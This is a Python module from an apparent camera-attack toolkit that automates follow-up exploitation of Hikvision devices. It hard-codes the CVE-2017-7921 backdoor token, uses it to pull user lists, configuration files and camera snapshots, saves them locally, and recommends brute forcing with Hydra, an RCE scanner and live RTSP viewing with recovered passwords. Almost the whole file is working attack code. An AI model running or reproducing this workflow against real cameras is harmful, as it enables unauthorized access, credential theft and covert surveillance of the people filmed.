"""Hikvision test follow-up: intel dump, snapshots, GUI next-tool hints."""

from __future__ import annotations

import json
import os
import re
from dataclasses import asdict, dataclass, field
from typing import Any

import requests

BACKDOOR_B64 = "YWRtaW46MTEK"
MIN_SNAPSHOT_BYTES = 1000


@dataclass
class NextToolStep:
    priority: int
    gui_name: str
    nav_hint: str
    reason: str


@dataclass
class HikvisionRunContext:
    host: str
    http_port: int = 80
    http_ports: list[int] = field(default_factory=list)
    backdoor_confirmed: bool = False
    digest_valid: bool = False
    digest_password: str | None = None
    device_info: dict[str, str] = field(default_factory=dict)
    extra_artifacts: dict[str, str] = field(default_factory=dict)
    snapshot_paths: list[str] = field(default_factory=list)
    intel_summary: dict[str, Any] = field(default_factory=dict)
    open_ports: list[int] = field(default_factory=list)


def _base_url(host: str, port: int) -> str:
    if port in (443, 8443):
        return f"https://{host}" if port == 443 else f"https://{host}:{port}"
    if port == 80:
        return f"http://{host}"
    return f"http://{host}:{port}"


def backdoor_endpoint_ok(name: str, status: int, content: bytes) -> bool:
    """Stricter than HTTP 200 — avoid login-page false positives (~151 bytes)."""
    if status != 200:
        return False
    low = content[:800].lower()
    if name == "snapshot":
        return len(content) >= MIN_SNAPSHOT_BYTES and b"<html" not in low[:300]
    if name == "users":
        text = content.decode("utf-8", errors="ignore").lower()
        return "userlist" in text or "<username>" in text
    if name == "config":
        return len(content) >= 500 and b"<html" not in low[:200]
    if name == "login_page":
        return False
    return len(content) > 300


def probe_backdoor_live(host: str, port: int) -> bool:
    from engines.device_cve_checker import probe_hikvision_backdoor

    return probe_hikvision_backdoor(host, port)


def gather_extended_intel(
    host: str,
    port: int,
    *,
    auth: tuple[str, str] | None = None,
    target_dir: str | None = None,
) -> dict[str, Any]:
    """DeviceInfo + users/config samples for CVE / SearchSploit research."""
    from engines.device_cve_checker import assess_hikvision, fetch_hikvision_device_info

    base = _base_url(host, port)
    session = requests.Session()
    session.verify = False
    session.headers["User-Agent"] = "Mozilla/5.0 Auto-PWN-HikWorkflow/1.0"
    auth_q = f"?auth={BACKDOOR_B64}"

    out: dict[str, Any] = {
        "host": host,
        "http_port": port,
        "device_info": fetch_hikvision_device_info(host, port, auth),
        "isapi_paths": {},
        "files_saved": [],
    }

    paths = {
        "users_xml": f"{base}/Security/users{auth_q}",
        "deviceInfo": f"{base}/ISAPI/System/deviceInfo",
        "capabilities": f"{base}/ISAPI/System/capabilities",
        "configurationFile": f"{base}/System/configurationFile{auth_q}",
    }

    digest_auth = None
    if auth:
        from engines.hikvision_snapshots import hikvision_digest_auth

        digest_auth = hikvision_digest_auth(auth[0], auth[1])

    for key, url in paths.items():
        try:
            kw: dict = {"timeout": 12}
            if digest_auth and "auth=" not in url:
                kw["auth"] = digest_auth
            r = session.get(url, **kw)
            out["isapi_paths"][key] = {
                "url": url,
                "status": r.status_code,
                "size": len(r.content),
            }
            if target_dir and r.status_code == 200 and len(r.content) > 200:
                if key == "configurationFile" and len(r.content) > 500:
                    path = os.path.join(target_dir, "configurationFile")
                    with open(path, "wb") as fh:
                        fh.write(r.content)
                    out["files_saved"].append(path)
                elif key == "users_xml" and b"user" in r.content.lower()[:500]:
                    path = os.path.join(target_dir, "hikvision_users.xml")
                    with open(path, "wb") as fh:
                        fh.write(r.content)
                    out["files_saved"].append(path)
                elif key == "deviceInfo" and b"device" in r.content.lower()[:300]:
                    path = os.path.join(target_dir, "hikvision_deviceInfo.xml")
                    with open(path, "wb") as fh:
                        fh.write(r.content)
                    out["files_saved"].append(path)
        except requests.RequestException as exc:
            out["isapi_paths"][key] = {"url": url, "error": str(exc)}

    intel = assess_hikvision(host, port=port, auth=auth)
    out["cve_assessments"] = [
        {
            "cve": a.cve_id,
            "status": a.status,
            "severity": a.severity,
            "title": a.title,
            "reason": a.reason,
            "attack": a.attack_method,
        }
        for a in intel.assessments
    ]
    out["nuclei_templates"] = intel.templates_to_run()
    out["nuclei_tags"] = intel.tags_string()
    out["firmware_build"] = intel.firmware_build
    out["model"] = intel.model
    out["firmware"] = intel.firmware
    out["backdoor_works"] = intel.backdoor_works

    fw = intel.firmware or ""
    model = intel.model or ""
    if model or fw:
        out["searchsploit_hints"] = [
            f"hikvision {model}".strip(),
            f"hikvision {fw}".strip(),
            "hikvision CVE-2017-7921",
            "hikvision CVE-2021-36260",
        ]

    return out


def capture_snapshots(
    host: str,
    port: int,
    *,
    use_backdoor: bool,
    auth: tuple[str, str] | None,
    target_dir: str,
) -> list[str]:
    """Save JPEG snapshots into targets/<IP>/snapshots/."""
    snap_dir = os.path.join(target_dir, "snapshots")
    os.makedirs(snap_dir, exist_ok=True)
    saved: list[str] = []

    if use_backdoor:
        from engines.hikvision_snapshots import download_backdoor_snapshots

        for p in download_backdoor_snapshots(host, snap_dir, port=port):
            saved.append(str(p))
        return saved

    if auth:
        from engines.hikvision_snapshots import download_all_snapshots

        for p in download_all_snapshots(
            host,
            auth[0],
            auth[1],
            output_dir=snap_dir,
            port=port,
            force_scan=False,
        ):
            saved.append(str(p))
    return saved


def build_next_tool_steps(ctx: HikvisionRunContext) -> list[NextToolStep]:
    """Map findings → sidebar tool names (GUI navigation labels)."""
    steps: list[NextToolStep] = []
    p = 1

    def add(gui_name: str, nav_hint: str, reason: str) -> None:
        nonlocal p
        steps.append(NextToolStep(p, gui_name, nav_hint, reason))
        p += 1

    if ctx.snapshot_paths:
        add(
            "Direct Camera",
            "Utilities → Direct Camera",
            f"Snapshots saved ({len(ctx.snapshot_paths)}) — open RTSP in VLC from workspace.",
        )

    if ctx.backdoor_confirmed:
        add(
            "AUTO-PWN Target",
            "Device Engine → AUTO-PWN Target",
            "CVE-2017-7921 confirmed — run full device engine (config dump, creds, PoCs).",
        )
        add(
            "Direct Camera",
            "Utilities → Direct Camera",
            "Use backdoor or recovered password for live streams (port 554 RTSP).",
        )

    if ctx.digest_valid and ctx.digest_password:
        add(
            "Direct Camera",
            "Utilities → Direct Camera",
            f"Set target bar to http://admin:{ctx.digest_password}@{ctx.host} then run Direct Camera.",
        )

    cve_rows = ctx.intel_summary.get("cve_assessments") or []
    needs_nuclei = any(
        row.get("status") in ("CONFIRMED", "LIKELY_VULNERABLE", "TRY")
        for row in cve_rows
    )
    if needs_nuclei or ctx.intel_summary.get("nuclei_templates"):
        tpl_n = len(ctx.intel_summary.get("nuclei_templates") or [])
        add(
            "Nuclei",
            "Master PWN — Classic → Nuclei",
            f"Run Hikvision CVE templates ({tpl_n} mapped) on port {ctx.http_port}.",
        )

    if any(row.get("cve") == "CVE-2021-36260" and row.get("status") == "LIKELY_VULNERABLE" for row in cve_rows):
        add(
            "Ingram",
            "Master PWN — Classic → Ingram",
            "Firmware in RCE range — camera exploit scanner.",
        )

    if 554 in ctx.open_ports and (ctx.digest_valid or ctx.backdoor_confirmed):
        add(
            "Direct Camera",
            "Utilities → Direct Camera",
            "RTSP port 554 open — VLC playlist will be written under targets/<IP>/.",
        )

    if ctx.extra_artifacts.get("configurationFile"):
        add(
            "AUTO-PWN Target",
            "Device Engine → AUTO-PWN Target",
            "configurationFile downloaded — engine can decrypt passwords from config.",
        )

    if not ctx.backdoor_confirmed and not ctx.digest_valid:
        add(
            "Hydra",
            "Master PWN — Classic → Hydra",
            "No confirmed creds — brute HTTP/Digest on web ports from Nmap.",
        )
        add(
            "Nmap",
            "Master PWN — Classic → Nmap",
            "Refresh port list if services changed.",
        )

    add(
        "Comprehensive Scan",
        "Dashboard → Comprehensive Scan",
        "Full phased scan (Nmap → profile tools → report) when single tools are not enough.",
    )

    add(
        "CVE Report",
        "Utilities → CVE Report",
        "Standalone CVE intelligence report for this target workspace.",
    )

    # De-duplicate by gui_name keeping first (highest priority)
    seen: set[str] = set()
    unique: list[NextToolStep] = []
    for s in sorted(steps, key=lambda x: x.priority):
        if s.gui_name in seen:
            continue
        seen.add(s.gui_name)
        unique.append(s)
    for i, s in enumerate(unique, start=1):
        s.priority = i
    return unique[:8]


def print_next_tool_steps(steps: list[NextToolStep]) -> None:
    print("\n" + "=" * 70)
    print("  NEXT TOOLS — اذهب إلى الأداة التالية في الواجهة")
    print("=" * 70)
    if not steps:
        print("  (لا توجد توصيات — راجع Artifacts في الـ workspace)")
        print("=" * 70 + "\n")
        return
    for s in steps:
        print(f"\n  [{s.priority}] {s.gui_name}")
        print(f"      المسار: {s.nav_hint}")
        print(f"      السبب: {s.reason}")
    print("\n" + "=" * 70 + "\n")


def save_run_report(target_dir: str, payload: dict[str, Any]) -> str:
    os.makedirs(target_dir, exist_ok=True)
    path = os.path.join(target_dir, "hikvision_test_report.json")
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, indent=2, ensure_ascii=False)
    return path


def run_post_test_workflow(
    ctx: HikvisionRunContext,
    *,
    target_dir: str | None = None,
    skip_snapshots: bool = False,
) -> HikvisionRunContext:
    """Intel + optional snapshots + next-step hints (called after credential tests)."""
    import os as _os

    from core.paths import project_root
    from core.workspace_ports import load_open_ports_from_workspace, open_port_numbers

    td = target_dir or _os.environ.get("ENGINE_WORKSPACE") or _os.path.join(
        project_root(), "targets", ctx.host
    )
    cached = load_open_ports_from_workspace(td)
    ctx.open_ports = open_port_numbers(cached)

    auth = ("admin", ctx.digest_password) if ctx.digest_password else None
    use_backdoor = ctx.backdoor_confirmed

    print("\n[5] DEVICE INTELLIGENCE (firmware → CVE / SearchSploit)")
    try:
        ctx.intel_summary = gather_extended_intel(
            ctx.host, ctx.http_port, auth=auth, target_dir=td
        )
        ctx.device_info = ctx.intel_summary.get("device_info") or {}
        if ctx.device_info:
            print(f"    Model    : {ctx.device_info.get('model', '?')}")
            print(f"    Firmware : {ctx.device_info.get('firmwareVersion', '?')}")
            print(f"    Build    : {ctx.device_info.get('firmwareReleasedDate', '?')}")
            print(f"    Serial   : {ctx.device_info.get('serialNumber', '?')}")
        for fp in ctx.intel_summary.get("files_saved") or []:
            ctx.extra_artifacts[_os.path.basename(fp)] = fp
            print(f"    [+] Saved: {_os.path.basename(fp)}")
        hints = ctx.intel_summary.get("searchsploit_hints") or []
        if hints:
            print("    SearchSploit (on Kali):")
            for h in hints[:4]:
                print(f"      searchsploit {h}")
    except Exception as exc:
        print(f"    [!] Extended intel failed: {exc}")

    if not skip_snapshots and (use_backdoor or auth):
        print("\n[6] SCREENSHOTS (same IP — backdoor or Digest)")
        try:
            ctx.snapshot_paths = capture_snapshots(
                ctx.host,
                ctx.http_port,
                use_backdoor=use_backdoor and not auth,
                auth=auth if auth else (("admin", "11") if use_backdoor else None),
                target_dir=td,
            )
            if ctx.snapshot_paths:
                for sp in ctx.snapshot_paths[:6]:
                    print(f"    [+] {sp}")
                if len(ctx.snapshot_paths) > 6:
                    print(f"    ... +{len(ctx.snapshot_paths) - 6} more in snapshots/")
            else:
                print("    [-] No JPEG saved (backdoor patched or wrong HTTP port — try port 8000).")
        except Exception as exc:
            print(f"    [!] Snapshot capture failed: {exc}")
    elif not use_backdoor and not auth:
        print("\n[6] SCREENSHOTS — skipped (no working backdoor or Digest password)")

    steps = build_next_tool_steps(ctx)
    print_next_tool_steps(steps)

    report = {
        "host": ctx.host,
        "http_port": ctx.http_port,
        "http_ports": ctx.http_ports,
        "open_ports": ctx.open_ports,
        "backdoor_confirmed": ctx.backdoor_confirmed,
        "digest_valid": ctx.digest_valid,
        "digest_password": ctx.digest_password,
        "device_info": ctx.device_info,
        "intel": ctx.intel_summary,
        "snapshots": ctx.snapshot_paths,
        "next_tools": [asdict(s) for s in steps],
    }
    path = save_run_report(td, report)
    print(f"[*] Full report: {path}")
    return ctx
